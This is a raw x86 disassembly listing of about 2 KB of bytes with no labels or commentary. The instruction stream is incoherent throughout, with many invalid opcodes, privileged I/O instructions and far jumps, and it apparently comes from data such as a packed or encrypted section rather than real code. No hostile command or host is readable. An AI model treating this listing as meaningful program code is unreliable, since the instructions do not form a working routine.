  409b82:	inc    esp
  409b83:	pop    esi
  409b84:	xor    bl,BYTE PTR [ecx+edi*1-0x287c8c6a]
  409b8b:	mov    ch,0x71
  409b8d:	mov    ch,BYTE PTR [edi]
  409b8f:	mov    eax,ds:0x53896e98
  409b94:	into   
  409b95:	and    eax,0x2fdc713
  409b9a:	add    dl,BYTE PTR [esi+0x119ed15a]
  409ba0:	mov    edx,0x3ee1c1d2
  409ba5:	mov    al,ds:0xe4814dfd
  409baa:	das    
  409bab:	sub    eax,0xb7dee1fd
  409bb0:	xchg   BYTE PTR [ecx-0x7b],bl
  409bb3:	mov    ebp,0xe68fceea
  409bb8:	rcl    ebx,cl
  409bba:	cmp    eax,0x5152041d
  409bbf:	mov    DWORD PTR [esi+eiz*1+0x4e],eax
  409bc3:	cmp    DWORD PTR [esi],ebp
  409bc5:	mov    eax,0xbcbad742
  409bca:	shl    BYTE PTR [eax-0x5a],cl
  409bcd:	xor    ecx,DWORD PTR [ebx+esi*2+0x192d6c7a]
  409bd4:	jo     0x409c01
  409bd6:	imul   ebx,DWORD PTR [edi],0xffffffb2
  409bd9:	lods   eax,DWORD PTR ds:[esi]
  409bda:	inc    esp
  409bdb:	sub    eax,0x7debb590
  409be0:	stos   BYTE PTR es:[edi],al
  409be1:	pop    es
  409be2:	gs xchg ecx,eax
  409be4:	push   ds
  409be5:	mov    ds:0x620e6083,al
  409bea:	xchg   ebp,eax
  409beb:	dec    ebx
  409bec:	and    eax,0xac02ef19
  409bf1:	mov    fs,WORD PTR [ebx+0x5a]
  409bf4:	or     al,0x9a
  409bf6:	and    al,0x32
  409bf8:	xchg   ebx,eax
  409bf9:	leave  
  409bfa:	in     al,dx
  409bfb:	mov    ch,0xa0
  409bfd:	xor    ebx,DWORD PTR [esi]
  409bff:	xor    BYTE PTR [eax-0x6],ch
  409c02:	push   eax
  409c03:	lahf   
  409c04:	xor    al,0xe0
  409c06:	lods   eax,DWORD PTR ds:[esi]
  409c07:	mov    al,0x1c
  409c09:	push   esp
  409c0a:	inc    ecx
  409c0b:	je     0x409c0e
  409c0d:	les    esi,FWORD PTR [eax]
  409c0f:	lahf   
  409c10:	pop    ebx
  409c11:	aad    0x67
  409c13:	and    BYTE PTR [esp+ebp*8-0x2a89452],bl
  409c1a:	jae    0x409ba5
  409c1c:	jnp    0x409bde
  409c1e:	retf   
  409c1f:	outs   dx,DWORD PTR ds:[esi]
  409c20:	stos   BYTE PTR es:[edi],al
  409c21:	sbb    eax,0x410557c8
  409c26:	into   
  409c27:	inc    eax
  409c28:	sbb    ecx,DWORD PTR [ecx+0x37]
  409c2b:	test   DWORD PTR [edi+0x3e],esp
  409c2e:	xchg   ebx,eax
  409c2f:	cmp    ebp,DWORD PTR [edi]
  409c31:	add    BYTE PTR [eax+eiz*8+0x5b11c862],dl
  409c38:	pop    es
  409c39:	shr    ch,cl
  409c3b:	add    ebp,0xffffffda
  409c3e:	in     eax,0xad
  409c40:	outs   dx,DWORD PTR ds:[esi]
  409c41:	adc    dh,BYTE PTR [ecx-0x3e1f9805]
  409c47:	and    al,0x18
  409c49:	rcl    BYTE PTR [eax-0x6a90e3c8],1
  409c4f:	or     bl,bh
  409c51:	pop    ebp
  409c52:	sub    al,0x9a
  409c54:	mov    ah,0xc4
  409c56:	je     0x409cb6
  409c58:	fdiv   QWORD PTR [ebp+0x15]
  409c5b:	and    DWORD PTR [eax+0x5b],0xf
  409c5f:	or     al,0x6a
  409c61:	sbb    bh,dh
  409c63:	xchg   BYTE PTR [ebx],dh
  409c65:	and    DWORD PTR [ebp-0x29],esp
  409c68:	fst    DWORD PTR [ebp+0x69e910bd]
  409c6e:	cmp    BYTE PTR [ebp-0x4be2f82a],0x38
  409c75:	pop    ecx
  409c76:	adc    esp,edx
  409c78:	jns    0x409ca9
  409c7a:	xchg   ebp,eax
  409c7b:	jg     0x409cc5
  409c7d:	dec    DWORD PTR [edx*4+0x71ad9748]
  409c84:	dec    esp
  409c85:	mov    fs,eax
  409c87:	dec    edi
  409c88:	hlt    
  409c89:	jb     0x409c1d
  409c8b:	cmp    DWORD PTR [esi-0x21],ebp
  409c8e:	mov    dh,0x55
  409c90:	imul   ecx,DWORD PTR [ecx+0x10],0xc8af98d9
  409c97:	cdq    
  409c98:	add    BYTE PTR ds:0x26c36b0c,0x90
  409c9f:	fs cwde 
  409ca1:	add    al,0x67
  409ca3:	inc    ecx
  409ca4:	or     esi,DWORD PTR [edx]
  409ca6:	fist   WORD PTR [ebp+0x78126ecb]
  409cac:	ins    BYTE PTR es:[edi],dx
  409cad:	sbb    al,0x1c
  409caf:	dec    esi
  409cb0:	das    
  409cb1:	inc    esp
  409cb2:	stos   DWORD PTR es:[edi],eax
  409cb3:	mov    ah,0xaa
  409cb5:	pop    ds
  409cb6:	mov    esi,0x18eee463
  409cbb:	jnp    0x409c92
  409cbd:	scas   al,BYTE PTR es:[edi]
  409cbe:	dec    eax
  409cbf:	loopne 0x409c9a
  409cc1:	mov    esi,0x1fac00a6
  409cc6:	push   cs
  409cc7:	mov    eax,ds:0x3841f9c
  409ccc:	mov    gs,WORD PTR [edx+0x5c064d57]
  409cd2:	mov    ah,0xf5
  409cd4:	mov    ebp,0x38df9cb7
  409cd9:	sub    al,0x33
  409cdb:	mov    WORD PTR [esi-0x44],cs
  409cde:	mov    ds:0xe0ed871,eax
  409ce3:	sub    ecx,DWORD PTR [edx+0x7555b1de]
  409ce9:	pop    esp
  409cea:	cmp    edx,DWORD PTR [edi]
  409cec:	pop    esp
  409ced:	jmp    0x409d04
  409cef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409cf0:	xchg   DWORD PTR [esi],ecx
  409cf2:	imul   ebx,esp,0x67aa9940
  409cf8:	shr    DWORD PTR [esi-0x4c],0xc
  409cfc:	xlat   BYTE PTR ds:[ebx]
  409cfd:	je     0x409cad
  409cff:	js     0x409d76
  409d01:	lahf   
  409d02:	inc    ebx
  409d03:	and    al,0x27
  409d05:	or     eax,0xca1cf672
  409d0a:	push   cs
  409d0b:	or     DWORD PTR [ebp-0x1a],0xffffffc7
  409d0f:	pop    ss
  409d10:	into   
  409d11:	(bad)  
  409d12:	jmp    0xafdc:0x879bbde4
  409d19:	cli    
  409d1a:	fwait
  409d1b:	enter  0x8113,0x26
  409d1f:	pop    esp
  409d20:	int3   
  409d21:	stos   BYTE PTR es:[edi],al
  409d22:	and    BYTE PTR [esp+ecx*2-0x2e6bf72a],ch
  409d29:	dec    esi
  409d2a:	stos   BYTE PTR es:[edi],al
  409d2b:	nop
  409d2c:	lods   eax,DWORD PTR ds:[esi]
  409d2d:	popa   
  409d2e:	cmc    
  409d2f:	or     cl,bh
  409d31:	inc    ecx
  409d32:	fcom   QWORD PTR [esi]
  409d34:	push   esi
  409d35:	lods   al,BYTE PTR ds:[esi]
  409d36:	ss scas al,BYTE PTR es:[edi]
  409d38:	pop    es
  409d39:	or     ecx,DWORD PTR [esi+ebp*4+0x576537dc]
  409d40:	or     BYTE PTR [esi+0x59],0xdb
  409d44:	inc    ebx
  409d45:	stc    
  409d46:	frstor [ecx+0x48]
  409d49:	jmp    0x409d5c
  409d4b:	dec    ecx
  409d4c:	and    al,0xea
  409d4e:	int3   
  409d4f:	fsub   QWORD PTR [ecx-0x3c8a930b]
  409d55:	and    bh,bh
  409d57:	mov    dh,0x6c
  409d59:	sbb    DWORD PTR [ebp-0x32c7457e],0xa1af9477
  409d63:	imul   esi,DWORD PTR [ebp-0x7bfd397e],0xcb8d25d1
  409d6d:	sub    cl,BYTE PTR [ecx+edi*4-0x520e4848]
  409d74:	loop   0x409d6e
  409d76:	loop   0x409d30
  409d78:	dec    edi
  409d79:	(bad)  
  409d7a:	and    DWORD PTR [edx+0x48d50eea],edi
  409d80:	ret    
  409d81:	data16 lods al,BYTE PTR ds:[esi]
  409d83:	sub    BYTE PTR [edx+0x39b200ed],0x68
  409d8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d8b:	push   eax
  409d8c:	mov    ds:0x3cfa5953,eax
  409d91:	and    dl,al
  409d93:	adc    al,0xfd
  409d95:	pop    ebx
  409d96:	jnp    0x409dbb
  409d98:	stos   BYTE PTR es:[edi],al
  409d99:	push   ebx
  409d9a:	loope  0x409dbb
  409d9c:	xchg   esi,eax
  409d9d:	and    ch,BYTE PTR [edi]
  409d9f:	js     0x409e20
  409da1:	jne    0x409dd7
  409da3:	and    DWORD PTR [esi],edx
  409da5:	and    dh,BYTE PTR [edx-0x79]
  409da8:	push   0x76
  409daa:	push   esp
  409dab:	and    eax,0x130dd86c
  409db0:	mov    al,ds:0x4c48ec97
  409db5:	aam    0xd4
  409db7:	test   eax,0x7d325f78
  409dbc:	nop
  409dbd:	in     eax,dx
  409dbe:	cli    
  409dbf:	icebp  
  409dc0:	ins    DWORD PTR es:[edi],dx
  409dc1:	fdivr  DWORD PTR [ebp-0x3796ec4f]
  409dc7:	cwde   
  409dc8:	xchg   edx,eax
  409dc9:	lods   eax,DWORD PTR ds:[esi]
  409dca:	je     0x409dd7
  409dcc:	scas   eax,DWORD PTR es:[edi]
  409dcd:	frstor [ebp+edx*8+0x78]
  409dd1:	mov    edx,0x9d2e87f1
  409dd6:	sbb    al,0x7d
  409dd8:	sbb    eax,0x9f2c78cf
  409ddd:	mov    eax,ds:0xafbc5159
  409de2:	test   BYTE PTR [ebp-0x571a455d],ch
  409de8:	in     eax,0x29
  409dea:	mov    al,0xab
  409dec:	jge    0x409dc8
  409dee:	lods   al,BYTE PTR ds:[esi]
  409def:	mov    eax,ebp
  409df1:	or     cl,BYTE PTR fs:[eax+eiz*1]
  409df5:	bound  ebp,QWORD PTR [esi+0x63c2bd60]
  409dfb:	(bad)  
  409dfc:	cs (bad) 
  409dfe:	jmp    0xf3a8aa4c
  409e03:	push   esp
  409e04:	push   esi
  409e05:	div    DWORD PTR [ecx+ecx*1]
  409e08:	push   esp
  409e09:	not    DWORD PTR [edi-0x12]
  409e0c:	jp     0x409d97
  409e0e:	mov    al,ds:0xfa88eb4d
  409e13:	repz stc 
  409e15:	loopne 0x409dd5
  409e17:	add    edi,DWORD PTR [eax+0x68]
  409e1a:	out    dx,eax
  409e1b:	pop    ecx
  409e1c:	jno    0x409e7d
  409e1e:	into   
  409e1f:	jmp    0xe60:0x5589f185
  409e26:	ss out 0x6c,al
  409e29:	xlat   BYTE PTR ds:[ebx]
  409e2a:	fidiv  WORD PTR [ecx]
  409e2c:	mov    al,ds:0xe1fcc4c
  409e31:	hlt    
  409e32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409e33:	stos   DWORD PTR es:[edi],eax
  409e34:	out    0x81,al
  409e36:	or     BYTE PTR [ebx],0xb9
  409e39:	lds    edi,FWORD PTR [ecx]
  409e3b:	fstp   QWORD PTR [esi-0x16]
  409e3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409e3f:	aaa    
  409e40:	xor    al,0xf8
  409e42:	mov    cl,0x1e
  409e44:	xchg   ebp,edx
  409e46:	jne    0x409e47
  409e48:	inc    BYTE PTR [ecx-0x1adcdecf]
  409e4e:	(bad)  
  409e4f:	stos   DWORD PTR es:[edi],eax
  409e50:	or     BYTE PTR [ebx+0x1c],dh
  409e53:	jmp    0x6a92538c
  409e58:	lock adc ch,ch
  409e5b:	int3   
  409e5c:	add    cl,bh
  409e5e:	ins    DWORD PTR es:[edi],dx
  409e5f:	jl     0x409e5e
  409e61:	or     al,0x13
  409e63:	adc    al,0xd6
  409e65:	icebp  
  409e66:	push   edi
  409e67:	test   eax,0x8a69891b
  409e6c:	sub    bl,BYTE PTR [ebp+0x51832860]
  409e72:	(bad)  
  409e73:	popa   
  409e74:	pop    esp
  409e75:	loope  0x409ebc
  409e77:	call   0x5da97052
  409e7c:	mov    BYTE PTR [eax-0x38ea4ef8],al
  409e82:	adc    edx,DWORD PTR [ebx+0x2]
  409e85:	std    
  409e86:	xor    al,0xe3
  409e88:	lods   eax,DWORD PTR ds:[esi]
  409e89:	hlt    
  409e8a:	gs lahf 
  409e8c:	arpl   di,sp
  409e8e:	adc    ebx,DWORD PTR [ecx]
  409e90:	pop    esp
  409e91:	jnp    0x409e2c
  409e93:	xor    al,0x82
  409e95:	push   ebx
  409e96:	adc    dl,BYTE PTR [ebx]
  409e98:	jb     0x409f13
  409e9a:	out    dx,al
  409e9b:	fbld   TBYTE PTR [ebx+0x5a]
  409e9e:	add    DWORD PTR [ecx],esp
  409ea0:	dec    eax
  409ea1:	(bad)  
  409ea3:	sbb    eax,0x63aa2e05
  409ea8:	scas   al,BYTE PTR es:[edi]
  409ea9:	jl     0x409ee4
  409eab:	test   DWORD PTR [eax],edx
  409ead:	(bad)  
  409eae:	loopne 0x409edb
  409eb0:	daa    
  409eb1:	sbb    BYTE PTR [edx],0x59
  409eb4:	mov    DWORD PTR [edi],0xc085a6b6
  409eba:	sbb    DWORD PTR [edx],ebp
  409ebc:	sub    eax,edi
  409ebe:	push   eax
  409ebf:	sti    
  409ec0:	xchg   BYTE PTR [esi],dl
  409ec2:	pop    esi
  409ec3:	popa   
  409ec4:	sbb    esp,DWORD PTR [ebx-0x4c9b78e3]
  409eca:	ins    BYTE PTR es:[edi],dx
  409ecb:	and    al,BYTE PTR [eax-0x5b39cb88]
  409ed1:	sbb    BYTE PTR [edx+ebx*2+0x3e19b648],al
  409ed8:	mov    cl,0x2d
  409eda:	pop    edi
  409edb:	mov    dh,al
  409edd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409ede:	popa   
  409edf:	in     eax,0xf8
  409ee1:	sti    
  409ee2:	xchg   edx,eax
  409ee3:	mov    ds:0x25dd0f4d,eax
  409ee8:	mov    cl,BYTE PTR [edx+0x1da2bbb1]
  409eee:	jl     0x409edd
  409ef0:	pop    ss
  409ef1:	adc    DWORD PTR [ecx+ebp*8],ebx
  409ef4:	shl    BYTE PTR [edi+edi*2+0x4aa42522],1
  409efb:	mov    BYTE PTR [edx-0x4f90a52f],al
  409f01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409f02:	dec    ecx
  409f03:	cmp    BYTE PTR [eax],al
  409f05:	into   
  409f06:	enter  0x6794,0x26
  409f0a:	int3   
  409f0b:	arpl   WORD PTR [ecx-0x49],cx
  409f0e:	push   cs
  409f0f:	sbb    eax,0x4fb669ec
  409f14:	push   esi
  409f15:	and    al,0x1b
  409f17:	cmp    BYTE PTR [eax-0x309b23af],cl
  409f1d:	outs   dx,DWORD PTR gs:[esi]
  409f1f:	idiv   cl
  409f21:	hlt    
  409f22:	iret   
  409f23:	push   eax
  409f24:	add    BYTE PTR [eax-0x2d976cd6],ch
  409f2a:	inc    esp
  409f2b:	in     al,dx
  409f2c:	mov    ah,0xe7
  409f2e:	das    
  409f2f:	out    0x12,eax
  409f31:	ja     0x409efe
  409f33:	xchg   esp,eax
  409f34:	gs mov esi,0x879797ab
  409f3a:	mov    ch,0xc5
  409f3c:	imul   esi,DWORD PTR [esi+0x3e],0xcc1eb939
  409f43:	loope  0x409ef8
  409f45:	int    0x2
  409f47:	xor    ah,BYTE PTR [edx+0x358eaa39]
  409f4d:	dec    esi
  409f4e:	jno    0x409f3d
  409f50:	jo     0x409f3a
  409f52:	fucomip st,st(5)
  409f54:	sub    ebp,DWORD PTR [ecx-0x34dea487]
  409f5a:	out    0x56,al
  409f5c:	sahf   
  409f5d:	sub    ecx,DWORD PTR [ecx]
  409f5f:	jmp    0xcf12:0xfc0f157b
  409f66:	rol    BYTE PTR [ebx+0x7b240532],cl
  409f6c:	push   es
  409f6d:	bound  eax,QWORD PTR [eax-0x753f8072]
  409f73:	or     BYTE PTR [edi],bh
  409f75:	inc    ebp
  409f76:	out    dx,eax
  409f77:	xor    eax,0xf901aef
  409f7c:	(bad)  
  409f7d:	out    0xf4,eax
  409f7f:	adc    al,0x73
  409f81:	es mov bl,0x98
  409f84:	dec    edi
  409f85:	pop    edi
  409f86:	adc    al,0x6c
  409f88:	jnp    0x409f6e
  409f8a:	out    0xe5,eax
  409f8c:	cmc    
  409f8d:	mov    dl,0x87
  409f8f:	mov    esi,0x70010488
  409f94:	sub    ch,bh
  409f96:	and    edi,DWORD PTR [ecx]
  409f98:	and    eax,0xb688c74
  409f9d:	pushf  
  409f9e:	xchg   BYTE PTR gs:[edi+edx*1-0x3],dh
  409fa3:	stos   DWORD PTR es:[edi],eax
  409fa4:	in     eax,0x5f
  409fa6:	inc    esi
  409fa7:	ficom  WORD PTR [edx-0x36]
  409faa:	sbb    ebx,DWORD PTR [ebx-0x69425bdb]
  409fb0:	retfw  
  409fb2:	test   eax,0x561e1f4e
  409fb7:	xchg   edx,eax
  409fb8:	add    BYTE PTR [esi],ah
  409fba:	fs mov ch,0xf0
  409fbd:	cmp    eax,0x16cd2bc8
  409fc2:	lea    eax,[ebx]
  409fc4:	ficomp WORD PTR [eax]
  409fc6:	retf   
  409fc7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409fc8:	ins    DWORD PTR es:[edi],dx
  409fc9:	sbb    al,0x73
  409fcb:	mov    DWORD PTR [edx+0x4bb62a04],edi
  409fd1:	jmp    0x317f:0x5b4e8fb8
  409fd8:	add    esp,DWORD PTR [esi-0x6562c7d1]
  409fde:	out    dx,al
  409fdf:	test   al,0xe6
  409fe1:	xor    esp,eax
  409fe3:	in     eax,dx
  409fe4:	mov    DWORD PTR [edi+0x2556f7e0],ebx
  409fea:	fs icebp 
  409fec:	or     ebp,DWORD PTR [esi+0x46]
  409fef:	adc    edx,DWORD PTR [eax]
  409ff1:	xchg   ebx,eax
  409ff2:	inc    ebx
  409ff3:	jg     0x409fdc
  409ff5:	and    eax,0xdee84f3
  409ffa:	arpl   bp,sp
  409ffc:	ins    BYTE PTR es:[edi],dx
  409ffd:	in     al,dx
  409ffe:	pop    ebp
  409fff:	and    bl,dh
  40a001:	mov    ss,WORD PTR [ebx+0x20]
  40a004:	unpcklps xmm4,XMMWORD PTR [ecx-0x18]
  40a008:	lahf   
  40a009:	scas   eax,DWORD PTR es:[edi]
  40a00a:	es jecxz 0x409fb2
  40a00d:	(bad)  
  40a00e:	pop    ebp
  40a00f:	and    DWORD PTR ds:0x621590f1,edi
  40a015:	sbb    DWORD PTR ds:0xd7fd7ca0,0xfffffff1
  40a01c:	xchg   esi,eax
  40a01d:	ret    
  40a01e:	scas   eax,DWORD PTR es:[edi]
  40a01f:	mov    bl,0x19
  40a021:	mov    ch,0x9
  40a023:	xor    eax,0x176deff
  40a028:	das    
  40a029:	sahf   
  40a02a:	xchg   edx,eax
  40a02b:	add    BYTE PTR [edx-0x3ae8ee68],ah
  40a031:	aam    0xe1
  40a033:	ins    DWORD PTR es:[edi],dx
  40a034:	clc    
  40a035:	adc    esp,ebp
  40a037:	repz call 0x85f0:0x7202fca0
  40a03f:	bound  eax,QWORD PTR [edx+0x14]
  40a042:	and    cl,BYTE PTR [esi]
  40a044:	add    BYTE PTR [esi-0x5c],ch
  40a047:	ja     0x40a09a
  40a049:	in     al,0x61
  40a04b:	iret   
  40a04c:	mov    ebx,0x41b4c6f
  40a051:	sbb    esp,DWORD PTR [esi+0x15]
  40a054:	jg     0x40a04c
  40a056:	xchg   edi,eax
  40a057:	pop    esi
  40a058:	push   cx
  40a05a:	leave  
  40a05b:	(bad)  
  40a05c:	out    dx,eax
  40a05d:	inc    ecx
  40a05e:	xchg   esp,eax
  40a05f:	ret    0xbcd7
  40a062:	ret    
  40a063:	xchg   ah,al
  40a065:	cmp    al,0x4
  40a067:	call   0xbe7848b5
  40a06c:	mov    ch,0x6c
  40a06e:	or     eax,esi
  40a070:	mov    eax,ds:0x6366808e
  40a075:	bound  ebp,QWORD PTR [eax]
  40a077:	nop
  40a078:	pop    edi
  40a079:	out    dx,al
  40a07a:	mov    ds:0x606c45cd,eax
  40a07f:	arpl   WORD PTR [eax],bx
  40a081:	mov    edi,DWORD PTR [edi+ecx*2]
  40a084:	jb     0x40a013
  40a086:	xchg   esp,eax
  40a087:	push   esp
  40a088:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a089:	sub    BYTE PTR [ecx+0x5b],0xaa
  40a08d:	call   0xfde3:0xd96b1db2
  40a094:	or     BYTE PTR [esi-0x491c33cf],dl
  40a09a:	mov    dh,0x4b
  40a09c:	jmp    0xd905:0x1789a53c
  40a0a3:	mov    eax,0xa7c63e30
  40a0a8:	fisubr WORD PTR [edi+0x716ad627]
  40a0ae:	and    DWORD PTR [ebp+0x1],0x6a84b95d
  40a0b5:	call   FWORD PTR [eax]
  40a0b7:	pop    esp
  40a0b8:	mov    esp,0xe7e0b8f8
  40a0bd:	and    eax,DWORD PTR [edi]
  40a0bf:	fmul   QWORD PTR gs:[eax-0x6ba2d004]
  40a0c6:	jb     0x40a0b9
  40a0c8:	in     eax,0xc7
  40a0ca:	fidivr DWORD PTR [esi]
  40a0cc:	dec    BYTE PTR [ecx]
  40a0ce:	or     DWORD PTR [ecx],eax
  40a0d0:	fadd   st(6),st
  40a0d2:	xchg   ebp,eax
  40a0d3:	mov    dh,0x6e
  40a0d5:	dec    esi
  40a0d6:	jno    0x40a090
  40a0d8:	aaa    
  40a0d9:	or     DWORD PTR [edx-0x6d50cbc2],0xa7f6041a
  40a0e3:	xor    al,0xc3
  40a0e5:	xor    ah,0x72
  40a0e8:	mov    BYTE PTR [esi-0x1db786a7],al
  40a0ee:	cmp    BYTE PTR [ebp+ebp*2-0x31],ah
  40a0f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a0f3:	pop    ebx
  40a0f4:	push   eax
  40a0f5:	into   
  40a0f6:	push   ecx
  40a0f7:	push   ecx
  40a0f8:	mov    fs,WORD PTR [edx-0x2e]
  40a0fb:	retf   0xef06
  40a0fe:	fs dec esi
  40a100:	(bad)  
  40a101:	xchg   esi,eax
  40a102:	test   DWORD PTR [ecx+0x44],esp
  40a105:	dec    esi
  40a106:	dec    ecx
  40a107:	leave  
  40a108:	sbb    al,0x1
  40a10a:	shl    DWORD PTR [ecx+0x65e700e8],1
  40a110:	hlt    
  40a111:	adc    ecx,esp
  40a113:	xchg   ebp,eax
  40a114:	push   cs
  40a115:	test   al,0x1c
  40a117:	dec    edi
  40a118:	pop    ecx
  40a119:	push   esi
  40a11a:	into   
  40a11b:	mov    bh,0xf4
  40a11d:	mov    al,0xa4
  40a11f:	icebp  
  40a120:	and    eax,0x3db0e3c3
  40a125:	push   0xffffff93
  40a127:	sbb    bh,BYTE PTR [eax+0x209cbd85]
  40a12d:	mov    DWORD PTR [ecx+0x6b],ebp
  40a130:	arpl   WORD PTR [ebp-0x1d],sp
  40a133:	mov    bh,BYTE PTR [edi+ecx*4]
  40a136:	inc    ecx
  40a137:	add    BYTE PTR [ecx-0x455c4cd2],0x4d
  40a13e:	ins    BYTE PTR es:[edi],dx
  40a13f:	xor    eax,0x5e7ada6b
  40a144:	loope  0x40a1c5
  40a146:	pop    DWORD PTR [ecx]
  40a148:	outs   dx,BYTE PTR ds:[esi]
  40a149:	and    BYTE PTR [edx+0x59eb9049],cl
  40a14f:	add    BYTE PTR [eax+0x796d7533],dh
  40a155:	adc    BYTE PTR [edx-0x2a],ch
  40a158:	(bad)  
  40a159:	xor    eax,DWORD PTR [ebx+0x5b559fd5]
  40a15f:	inc    BYTE PTR [ebx-0x56c6934e]
  40a165:	pop    ds
  40a166:	cmp    dl,ch
  40a168:	cmc    
  40a169:	call   FWORD PTR [bp+di+0x1712]
  40a16e:	sub    DWORD PTR ss:[edx],eax
  40a171:	mov    ?,WORD PTR [esp+ebp*1+0x32]
  40a175:	out    0xeb,eax
  40a177:	push   edi
  40a178:	rcl    BYTE PTR [esi-0x6f721562],1
  40a17e:	adc    edx,DWORD PTR [ebp-0x12]
  40a181:	pushf  
  40a182:	scas   al,BYTE PTR es:[edi]
  40a183:	adc    bh,dh
  40a185:	aad    0x50
  40a187:	int    0x50
  40a189:	mov    dl,ch
  40a18b:	mov    eax,ds:0x2c5c7969
  40a190:	bound  edx,QWORD PTR [ecx]
  40a192:	pop    ecx
  40a193:	mov    ds:0x82be7483,eax
  40a198:	mov    di,0x3711
  40a19c:	imul   BYTE PTR [esi]
  40a19e:	cmp    eax,0x973e4bbb
  40a1a3:	push   es
  40a1a4:	pop    ds
  40a1a5:	pop    es
  40a1a6:	inc    esi
  40a1a7:	xchg   edi,eax
  40a1a8:	inc    esp
  40a1a9:	sahf   
  40a1aa:	dec    ecx
  40a1ab:	stos   BYTE PTR es:[edi],al
  40a1ac:	ins    DWORD PTR es:[edi],dx
  40a1ad:	mov    esi,0xbf71a6c0
  40a1b2:	loope  0x40a19a
  40a1b4:	aam    0xe8
  40a1b6:	sti    
  40a1b7:	enter  0x675,0x98
  40a1bb:	dec    BYTE PTR [ecx]
  40a1bd:	push   edx
  40a1be:	fdivr  QWORD PTR gs:[eax-0x4]
  40a1c2:	(bad)  
  40a1c3:	xor    ecx,DWORD PTR [edx+eiz*2]
  40a1c6:	bnd js 0x40a22e
  40a1c9:	or     eax,0xe05dba95
  40a1ce:	cmp    dl,BYTE PTR [eax]
  40a1d0:	pop    edx
  40a1d1:	inc    esi
  40a1d2:	xchg   edx,eax
  40a1d3:	jecxz  0x40a22d
  40a1d5:	mov    dh,0xa9
  40a1d7:	xchg   edx,ebx
  40a1d9:	add    edx,DWORD PTR [esi-0x52]
  40a1dc:	mov    gs,WORD PTR [edi-0x4e23648e]
  40a1e2:	cmp    edi,DWORD PTR [esi+0x3c]
  40a1e5:	and    ch,BYTE PTR [esp+edx*8+0x42]
  40a1e9:	mov    bl,0x1f
  40a1eb:	(bad)  
  40a1ed:	(bad)  
  40a1ef:	mov    cl,BYTE PTR [esi-0x40]
  40a1f2:	lds    ebx,FWORD PTR [edx+0x62]
  40a1f5:	lds    ecx,FWORD PTR [ebx-0x6609d7ae]
  40a1fb:	or     BYTE PTR [ebx+esi*2-0x3],bh
  40a1ff:	dec    ebx
  40a200:	dec    ecx
  40a201:	push   edx
  40a202:	add    DWORD PTR [edi+edi*4],ecx
  40a205:	mov    BYTE PTR [edx+ecx*4],0x68
  40a209:	push   0x52a82575
  40a20e:	in     al,dx
  40a20f:	push   0xe6803c62
  40a214:	mov    ecx,0xc02cc2c0
  40a219:	in     al,0x32
  40a21b:	retf   0x3d23
  40a21e:	shl    BYTE PTR ds:0x6207c6d8,cl
  40a224:	imul   ebx,ebp,0x1
  40a227:	fstp   QWORD PTR [esi+0x7a436b3d]
  40a22d:	pop    esi
  40a22e:	(bad)  
  40a22f:	dec    esi
  40a230:	xchg   ebp,eax
  40a231:	jl     0x40a1de
  40a233:	mov    esi,0x82a5a19b
  40a238:	and    al,0x4c
  40a23a:	jmp    FWORD PTR [edx-0x22]
  40a23d:	or     DWORD PTR [ebp+0x2fd9aa38],0x15
  40a244:	(bad)  
  40a246:	mov    eax,ds:0x20cf3816
  40a24b:	arpl   WORD PTR [esi],bx
  40a24d:	xor    ebx,ebp
  40a24f:	push   ds
  40a250:	xchg   ecx,ebx
  40a252:	sub    DWORD PTR [eax],edi
  40a254:	ja     0x40a259
  40a256:	std    
  40a257:	(bad)  
  40a259:	test   al,0xff
  40a25b:	(bad)  
  40a25c:	data16 xor al,0x83
  40a25f:	xchg   DWORD PTR [eax-0x38],edx
  40a262:	pop    esi
  40a263:	imul   esi,DWORD PTR [edi],0xc6385ab5
  40a269:	adc    cl,BYTE PTR [eax-0x68742667]
  40a26f:	mov    esp,DWORD PTR [ebx+eiz*4]
  40a272:	mov    ebx,ebp
  40a274:	stos   DWORD PTR es:[edi],eax
  40a275:	xchg   esp,eax
  40a276:	fs in  al,0xb8
  40a279:	cli    
  40a27a:	pop    es
  40a27b:	jge    0x40a243
  40a27d:	dec    edx
  40a27e:	test   DWORD PTR [esp+ecx*4],edx
  40a281:	fisub  WORD PTR [edx+esi*2-0x36]
  40a285:	fld    DWORD PTR [ebp-0x5e]
  40a288:	scas   eax,DWORD PTR es:[edi]
  40a289:	xchg   ecx,eax
  40a28a:	xor    BYTE PTR [ebx+0x61c73671],ah
  40a290:	in     eax,0x6a
  40a292:	repnz aaa 
  40a294:	xchg   ebp,eax
  40a295:	jge    0x40a2c4
  40a297:	loope  0x40a29d
  40a299:	and    DWORD PTR [edx],eax
  40a29b:	(bad)  [ecx-0x10d3cf62]
  40a2a1:	push   eax
  40a2a2:	fisubr DWORD PTR [ebp-0x22bdeebd]
  40a2a8:	adc    BYTE PTR [ecx],dh
  40a2aa:	inc    esp
  40a2ab:	test   ax,0x81be
  40a2af:	cmp    eax,DWORD PTR [edi-0x5c]
  40a2b2:	test   BYTE PTR [edi-0x15],cl
  40a2b5:	cmp    ebp,ebp
  40a2b7:	mov    ch,0x97
  40a2b9:	jae    0x40a2d6
  40a2bb:	icebp  
  40a2bc:	pop    edi
  40a2bd:	jmp    0x562a2127
  40a2c2:	pop    ds
  40a2c3:	sbb    eax,0x48044f8
  40a2c8:	sub    eax,0x5d9f6b18
  40a2cd:	stc    
  40a2ce:	mov    esp,DWORD PTR [edi]
  40a2d0:	rcl    DWORD PTR [edi],0xe0
  40a2d3:	and    al,0x75
  40a2d5:	ja     0x40a29d
  40a2d7:	imul   esi,DWORD PTR [ecx+ecx*4],0xffffffc4
  40a2db:	or     bh,0x26
  40a2de:	pushf  
  40a2df:	inc    ecx
  40a2e0:	je     0x40a307
  40a2e2:	jae    0x40a27b
  40a2e4:	pop    ss
  40a2e5:	cwde   
  40a2e6:	pop    es
  40a2e7:	add    al,0x10
  40a2e9:	ds xchg ebx,eax
  40a2eb:	addr16 int 0x84
  40a2ee:	sahf   
  40a2ef:	out    dx,eax
  40a2f0:	pop    ds
